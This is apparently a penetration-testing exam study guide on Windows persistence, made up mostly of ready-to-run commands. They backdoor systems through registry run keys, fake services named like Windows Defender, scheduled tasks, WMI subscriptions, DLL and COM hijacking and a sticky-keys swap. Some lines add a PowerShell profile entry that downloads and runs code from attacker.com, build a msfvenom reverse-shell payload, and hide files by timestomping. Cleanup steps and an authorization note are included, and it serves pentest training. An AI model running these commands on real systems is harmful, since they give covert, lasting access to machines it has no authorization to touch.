# Windows Persistence Techniques

## Overview
Persistence is the art of maintaining access to a compromised system across reboots, user logouts, and other system changes. This guide covers the most common and effective Windows persistence techniques used in penetration testing.

## What is Persistence?

### Definition
**Persistence** refers to techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

### Why Persistence Matters for PJPT
- **Maintain access** during long-term engagements
- **Survive system reboots** and user logouts
- **Demonstrate impact** to clients
- **Essential for advanced post-exploitation** activities

## Registry-Based Persistence

### 1. Registry Run Keys
The most common persistence method using Windows registry autorun locations.

#### Current User Run Key
```cmd
# Add persistence for current user
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f

# PowerShell equivalent
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SecurityUpdate" -Value "C:\Users\Public\update.exe" -PropertyType String -Force

# Verify persistence entry
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

#### Local Machine Run Key (Requires Admin)
```cmd
# Add system-wide persistence (requires admin rights)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\backdoor.exe" /f

# PowerShell equivalent
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\Windows\System32\backdoor.exe" -PropertyType String -Force
```

#### Additional Registry Locations
```cmd
# RunOnce keys (execute once then delete)
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Run keys for specific scenarios  
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices

# Winlogon registry keys
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

### 2. Registry Persistence Examples
```cmd
# Userinit persistence (very stealthy)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\system32\backdoor.exe" /f

# Shell persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,C:\Windows\system32\backdoor.exe" /f

# Image File Execution Options (IFEO) hijacking
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\system32\backdoor.exe" /f
```

## Service-Based Persistence

### 1. Creating Windows Services
```cmd
# Create new service for persistence
sc create "WindowsSecurityUpdate" binpath= "C:\Windows\System32\backdoor.exe" start= auto
sc description "WindowsSecurityUpdate" "Provides critical security updates for Windows"
sc start "WindowsSecurityUpdate"

# PowerShell service creation
New-Service -Name "WindowsSecurityUpdate" -BinaryPathName "C:\Windows\System32\backdoor.exe" -StartupType Automatic -Description "Provides critical security updates"
Start-Service -Name "WindowsSecurityUpdate"
```

### 2. Modifying Existing Services
```cmd
# Modify existing service binary path
sc config "Spooler" binpath= "C:\Windows\System32\backdoor.exe && C:\Windows\System32\spoolsv.exe"

# Modify service to depend on our malicious service
sc config "Spooler" depend= "WindowsSecurityUpdate"

# Query service configuration
sc qc "WindowsSecurityUpdate"
```

### 3. Service DLL Hijacking
```cmd
# Modify service to load malicious DLL
reg add "HKLM\SYSTEM\CurrentControlSet\Services\YourService\Parameters" /v "ServiceDll" /t REG_EXPAND_SZ /d "C:\Windows\System32\malicious.dll" /f

# Restart service to load malicious DLL
sc stop "YourService"
sc start "YourService"
```

## Scheduled Tasks Persistence

### 1. Basic Scheduled Task Creation
```cmd
# Create scheduled task that runs at startup
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\backdoor.exe" /sc onstart /ru "SYSTEM" /f

# Create task that runs every 5 minutes
schtasks /create /tn "SystemMaintenance" /tr "C:\Windows\System32\backdoor.exe" /sc minute /mo 5 /ru "SYSTEM" /f

# Create task that runs at user logon
schtasks /create /tn "UserProfile" /tr "C:\Windows\System32\backdoor.exe" /sc onlogon /ru "SYSTEM" /f
```

### 2. PowerShell Scheduled Tasks
```powershell
# Create scheduled task using PowerShell
$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WindowsSecurityUpdate" -Action $action -Trigger $trigger -Principal $principal

# Create task with multiple triggers
$trigger1 = New-ScheduledTaskTrigger -AtStartup
$trigger2 = New-ScheduledTaskTrigger -AtLogOn
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\System32\script.ps1"
Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger @($trigger1, $trigger2) -RunLevel Highest
```

### 3. Scheduled Task Management
```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v

# Query specific task
schtasks /query /tn "WindowsUpdate" /fo LIST /v

# Delete scheduled task
schtasks /delete /tn "WindowsUpdate" /f

# Modify existing task
schtasks /change /tn "WindowsUpdate" /tr "C:\Windows\System32\newbackdoor.exe"
```

## Startup Folder Persistence

### 1. User Startup Folder
```cmd
# Copy backdoor to user startup folder
copy "C:\Windows\System32\backdoor.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# PowerShell copy
Copy-Item "C:\Windows\System32\backdoor.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Create shortcut in startup folder
powershell "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk'); $Shortcut.TargetPath = 'C:\Windows\System32\backdoor.exe'; $Shortcut.Save()"
```

### 2. All Users Startup Folder (Admin Required)
```cmd
# Copy to all users startup (requires admin)
copy "C:\Windows\System32\backdoor.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"

# PowerShell copy for all users
Copy-Item "C:\Windows\System32\backdoor.exe" "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp\update.exe"
```

## WMI Persistence

### 1. WMI Event Subscription
```powershell
# Create WMI event filter (trigger)
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemStartupFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
} -ErrorAction Stop

# Create WMI event consumer (action)
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemStartupConsumer"
    CommandLineTemplate = "C:\Windows\System32\backdoor.exe"
} -ErrorAction Stop

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
} -ErrorAction Stop
```

### 2. WMI Persistence Cleanup
```powershell
# Remove WMI persistence
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription -Filter "Filter = '__EventFilter.Name=""SystemStartupFilter""'" | Remove-WmiObject
Get-WmiObject __EventFilter -Namespace root\subscription -Filter "Name = 'SystemStartupFilter'" | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "Name = 'SystemStartupConsumer'" | Remove-WmiObject
```

## DLL Hijacking Persistence

### 1. DLL Search Order Hijacking
```cmd
# Identify DLL hijacking opportunities
# Look for missing DLLs in application directories
Process Monitor (ProcMon) -> Filter by "Process and Thread Activity" -> Look for "NAME NOT FOUND"

# Common hijackable DLLs
C:\Windows\System32\WINMM.dll
C:\Windows\System32\WININET.dll
C:\Windows\System32\VERSION.dll
```

### 2. Phantom DLL Hijacking
```cmd
# Create malicious DLL in application directory
# Copy legitimate DLL functionality and add backdoor code
copy "malicious.dll" "C:\Program Files\VulnerableApp\missing.dll"

# Restart application to load malicious DLL
taskkill /f /im "VulnerableApp.exe"
start "" "C:\Program Files\VulnerableApp\VulnerableApp.exe"
```

## Advanced Persistence Techniques

### 1. COM Hijacking
```cmd
# Identify COM objects to hijack
reg query "HKCU\SOFTWARE\Classes\CLSID" /s | findstr /i "inprocserver32"

# Hijack COM object
reg add "HKCU\SOFTWARE\Classes\CLSID\{CLSID-HERE}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\backdoor.dll" /f
```

### 2. AppInit_DLLs
```cmd
# Add DLL to AppInit_DLLs (loads into every process)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "AppInit_DLLs" /t REG_SZ /d "C:\Windows\System32\malicious.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f
```

### 3. Accessibility Features Backdoor
```cmd
# Replace sticky keys with cmd.exe (classic technique)
takeown /f "C:\Windows\System32\sethc.exe" /a
icacls "C:\Windows\System32\sethc.exe" /grant administrators:F
copy /y "C:\Windows\System32\cmd.exe" "C:\Windows\System32\sethc.exe"

# Use at login screen by pressing SHIFT 5 times

# Other accessibility features to hijack
C:\Windows\System32\utilman.exe (Windows Key + U)
C:\Windows\System32\osk.exe (On-Screen Keyboard)
C:\Windows\System32\narrator.exe (Windows Key + Enter)
```

## PowerShell-Based Persistence

### 1. PowerShell Profile Modification
```powershell
# Modify PowerShell profile for persistence
$ProfilePath = $PROFILE.AllUsersAllHosts
Add-Content -Path $ProfilePath -Value 'Start-Process "C:\Windows\System32\backdoor.exe" -WindowStyle Hidden'

# User-specific profile
$UserProfile = $PROFILE.CurrentUserAllHosts
Add-Content -Path $UserProfile -Value 'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")'
```

### 2. PowerShell ISE Persistence
```powershell
# Modify PowerShell ISE profile
$ISEProfile = $PROFILE.CurrentUserCurrentHost.Replace("profile.ps1", "Microsoft.PowerShellISE_profile.ps1")
Add-Content -Path $ISEProfile -Value 'Start-Process "C:\Windows\System32\backdoor.exe" -WindowStyle Hidden'
```

## Persistence Detection Evasion

### 1. Timestomping
```cmd
# Match file timestamps to system files
powershell "(Get-Item 'C:\Windows\System32\backdoor.exe').LastWriteTime = (Get-Item 'C:\Windows\System32\kernel32.dll').LastWriteTime"
powershell "(Get-Item 'C:\Windows\System32\backdoor.exe').CreationTime = (Get-Item 'C:\Windows\System32\kernel32.dll').CreationTime"
```

### 2. File Attribute Manipulation
```cmd
# Hide files and set system attributes
attrib +h +s "C:\Windows\System32\backdoor.exe"

# Remove from directory listings
attrib +h +s +r "C:\Windows\System32\backdoor.exe"
```

## Practical Persistence Scenarios

### Scenario 1: User-Level Persistence
```cmd
# 1. Create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > backdoor.exe

# 2. Upload to target
copy backdoor.exe "C:\Users\Public\update.exe"

# 3. Create registry persistence
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "C:\Users\Public\update.exe" /f

# 4. Test persistence
shutdown /r /t 0
```

### Scenario 2: System-Level Persistence
```cmd
# 1. Escalate to SYSTEM privileges
# (use token impersonation, service exploitation, etc.)

# 2. Create service persistence
sc create "WindowsDefender" binpath= "C:\Windows\System32\backdoor.exe" start= auto
sc description "WindowsDefender" "Windows Defender Antivirus Service"

# 3. Start service
sc start "WindowsDefender"

# 4. Create scheduled task backup
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\System32\backdoor.exe" /sc onstart /ru "SYSTEM" /f
```

### Scenario 3: Stealth Persistence
```cmd
# 1. Use DLL hijacking for stealth
# Find vulnerable application
# Create malicious DLL

# 2. Modify existing service
sc config "Spooler" binpath= "C:\Windows\System32\backdoor.exe && C:\Windows\System32\spoolsv.exe"

# 3. WMI persistence for advanced stealth
# Use PowerShell WMI event subscription

# 4. COM hijacking
reg add "HKCU\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32" /ve /t REG_SZ /d "malicious.dll" /f
```

## Cleanup and Removal

### Registry Cleanup
```cmd
# Remove registry run keys
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f

# Remove winlogon persistence
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
```

### Service Cleanup
```cmd
# Stop and delete services
sc stop "WindowsSecurityUpdate"
sc delete "WindowsSecurityUpdate"

# Restore modified services
sc config "Spooler" binpath= "C:\Windows\System32\spoolsv.exe"
```

### Scheduled Task Cleanup
```cmd
# Delete scheduled tasks
schtasks /delete /tn "WindowsUpdate" /f
schtasks /delete /tn "SystemMaintenance" /f
```

## PJPT Exam Tips

### Essential Commands to Memorize
```cmd
# Registry persistence
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe" /f

# Service persistence
sc create "Service" binpath= "C:\backdoor.exe" start= auto

# Scheduled task persistence  
schtasks /create /tn "Task" /tr "C:\backdoor.exe" /sc onstart /ru "SYSTEM" /f

# Startup folder persistence
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Documentation Requirements
1. **Show privilege level** required for each technique
2. **Document persistence method** used
3. **Provide cleanup instructions** for client
4. **Test persistence** across reboots
5. **Screenshot evidence** of successful persistence

### Common Mistakes to Avoid
- Not testing persistence after reboot
- Using obvious names for services/tasks
- Forgetting to document cleanup procedures
- Not considering detection/evasion
- Failing to escalate privileges when needed

---

**Note**: Always ensure proper authorization before implementing persistence techniques. These methods should only be used in authorized penetration testing scenarios. Proper cleanup is essential to avoid impacting client systems after the engagement. 